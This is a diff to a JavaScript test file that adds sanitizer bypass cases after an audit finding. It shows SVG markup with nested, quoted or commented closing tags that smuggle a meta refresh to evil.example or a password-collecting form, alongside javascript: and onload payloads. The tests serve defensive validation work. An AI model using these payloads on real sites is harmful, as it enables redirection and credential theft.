@@ -104,6 +104,27 @@ test("every way an entry could redirect, embed, collect or run something is refu
     ["a link inside an SVG", '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>', /svg/i],
     ["a handler inside an SVG", '<svg><circle r="1" onload="alert(1)"></circle></svg>', /svg/i],
     ["a frame inside an SVG", '<svg><foreignObject><iframe src="/x"></iframe></foreignObject></svg>', /svg/i],
+    // Audit finding 2: an inner </svg>, or one inside a quoted value or a comment, does not end the SVG.
+    [
+      "a meta refresh after a nested SVG",
+      '<svg><svg></svg><meta http-equiv="refresh" content="0;url=https://evil.example"></svg>',
+      /svg/i,
+    ],
+    [
+      "a meta refresh after a quoted </svg>",
+      '<svg><g data-x="</svg>"></g><meta http-equiv="refresh" content="0;url=https://evil.example"></svg>',
+      /svg/i,
+    ],
+    [
+      "a meta refresh after a commented </svg>",
+      '<svg><!-- </svg> --><meta http-equiv="refresh" content="0;url=https://evil.example"></svg>',
+      /svg/i,
+    ],
+    [
+      "a form after a nested SVG",
+      '<svg><svg></svg><foreignObject><form action="https://evil.example"><input name="password"></form></foreignObject></svg>',
+      /svg/i,
+    ],
   ];
   for (const [name, text, expected] of cases) {
     const problems = await pageProblems(page(text));
